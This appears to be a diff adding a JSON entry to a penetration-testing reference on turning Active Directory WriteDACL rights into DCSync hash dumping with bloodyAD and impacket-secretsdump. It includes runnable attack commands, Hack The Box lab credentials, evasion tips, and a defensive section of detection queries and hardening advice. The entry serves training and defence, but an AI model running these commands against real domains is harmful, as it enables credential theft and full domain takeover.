@@ -1,0 +1,102 @@
+{
+  "id": "ad-writedacl-linux",
+  "name": "WriteDACL to DCSync (bloodyAD, Linux)",
+  "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <user>",
+  "description": "With WriteDACL over the domain object (or a target), grant your own account the DS-Replication-Get-Changes / DS-Replication-Get-Changes-All rights, then DCSync to pull password hashes. bloodyAD's 'add dcsync' writes the ACE for you; secretsdump then replicates.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Active Directory",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "HTB Fluffy engagement; bloodyAD DACL abuse",
+  "tags": [
+    "writedacl",
+    "dcsync",
+    "acl-abuse",
+    "bloodyad",
+    "dacl",
+    "replication"
+  ],
+  "mitre": [
+    "T1222.001",
+    "T1003.006"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nWriteDACL over the domain (or an object) lets you modify its ACL. Grant your account the\ntwo replication rights (DS-Replication-Get-Changes + -Get-Changes-All) and you can DCSync\nany principal - including krbtgt and Administrator.\n\n=== bloodyAD ONE-LINER ===\n  bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add dcsync <user>\n  # adds the DCSync ACE for <user> on the domain head.\n\n=== THEN DCSYNC ===\n  impacket-secretsdump -just-dc <domain>/<user>:<password>@<dc_ip>\n  # or a single target:\n  impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>\n\n=== CLEANUP ===\n  bloodyAD ... remove dcsync <user>   # strip the ACE you added\n\n=== WHY LOUD ===\nModifying the domain DACL and replicating hashes are both high-signal. Expect 4662/5136.\nRemove the ACE afterward.",
+  "examples": [
+    {
+      "label": "Grant self DCSync via WriteDACL",
+      "command": "bloodyAD --host 10.129.65.243 -d fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' add dcsync j.fleischman"
+    },
+    {
+      "label": "DCSync all hashes",
+      "command": "impacket-secretsdump -just-dc fluffy.htb/j.fleischman:'J0elTHEM4n1990!'@10.129.65.243"
+    },
+    {
+      "label": "DCSync only krbtgt (for golden ticket)",
+      "command": "impacket-secretsdump -just-dc-user krbtgt <domain>/<user>:<password>@<dc_ip>"
+    },
+    {
+      "label": "Remove the DCSync ACE (cleanup)",
+      "command": "bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> remove dcsync <user>"
+    }
+  ],
+  "references": [
+    {
+      "title": "bloodyAD",
+      "url": "https://github.com/CravateRouge/bloodyAD"
+    },
+    {
+      "title": "The Hacker Recipes - DCSync",
+      "url": "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-genericall-group",
+      "note": "WriteDACL is often reached via GenericAll/Owns on the domain object.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "WriteDACL over the domain object lets the attacker add an ACE granting themselves the directory replication rights; the DC then honors a replication (DCSync) request from that account and returns password hashes.",
+    "prerequisites": "WriteDACL (or Owns / WriteOwner then WriteDACL) over the domain head or a target object.",
+    "impact": "DCSync of any principal (krbtgt, Administrator) - full domain compromise.",
+    "detection": "[MITRE T1003.006] Event 5136 modifying nTSecurityDescriptor on the domain object; Event 4662 with the replication GUIDs (1131f6aa-... / 1131f6ad-...) from a non-DC account; correlate the DACL change with a subsequent replication.",
+    "artifacts": "5136 on nTSecurityDescriptor of the domain; 4662 replication access by a user account; 4670 (permissions on an object were changed).",
+    "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=5136 AttributeLDAPDisplayName=\"nTSecurityDescriptor\"\n| table _time, SubjectUserName, ObjectDN, OperationType\n\nindex=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4662 Properties=\"*1131f6aa*\" OR Properties=\"*1131f6ad*\"\n| where Account_Name!=\"*$\"\n| table _time, Account_Name, ObjectName",
+    "elastic_kql": "event.code:\"4662\" AND winlog.event_data.Properties:(*1131f6aa* OR *1131f6ad*) AND not winlog.event_data.SubjectUserName:*$",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4662 and (Properties has \"1131f6aa\" or Properties has \"1131f6ad\")\n| where SubjectUserName !endswith \"$\"\n| project TimeGenerated, Actor=SubjectUserName, Object=ObjectName\n| union (SecurityEvent | where EventID == 5136 and AttributeLDAPDisplayName == \"nTSecurityDescriptor\" | project TimeGenerated, Actor=SubjectUserName, Object=ObjectDN)\n| sort by TimeGenerated desc",
+    "sigma_rules": "win_security_dcsync_replication_rights, win_security_domain_dacl_modification",
+    "prevention": "Restrict WriteDACL/Owns on the domain object to Tier-0 admins; alert on 5136 changes to nTSecurityDescriptor on the domain head and on 4662 replication by non-DC accounts; baseline which principals legitimately replicate; treat any user-account DCSync as an incident.",
+    "evasion": "Grant, DCSync a single target, then remove the ACE quickly to shorten exposure; use an account that already looks privileged.",
+    "sources": [
+      "HTB Fluffy",
+      "MITRE T1003.006"
+    ],
+    "misconfiguration": "Non-Tier-0 principals hold WriteDACL / Owns / WriteOwner over the domain object, letting them self-grant replication rights.",
+    "vulnerable_config": "# BloodHound: WriteDacl/Owns/WriteOwner edge to the domain.\nGet-DomainObjectAcl -Identity '<domain>' -ResolveGUIDs |\n  ? { $_.ActiveDirectoryRights -match 'WriteDacl|WriteOwner' }",
+    "secure_config": "# Remove the excessive ACE on the domain object; restrict to Domain Admins / Tier-0.\n# Alert on Event 4662 with replication GUIDs where the account is not a Domain Controller."
+  },
+  "tools": [
+    "bloodyAD",
+    "impacket"
+  ],
+  "interview": [
+    {
+      "q": "How does WriteDACL over the domain lead to DCSync?",
+      "a": "WriteDACL lets you modify the domain object's ACL, so you add an ACE granting your account DS-Replication-Get-Changes and -Get-Changes-All. With those rights you run DCSync (secretsdump) to replicate password hashes for any principal, including krbtgt and Administrator.",
+      "role": "both"
+    },
+    {
+      "q": "What is the definitive detection for DCSync abuse?",
+      "a": "Event 4662 containing the replication extended-right GUIDs (1131f6aa-... and 1131f6ad-...) requested by an account that is not a Domain Controller, ideally correlated with a preceding 5136 change to the domain's nTSecurityDescriptor. Any non-DC replication is an incident.",
+      "role": "soc"
+    }
+  ]
+}
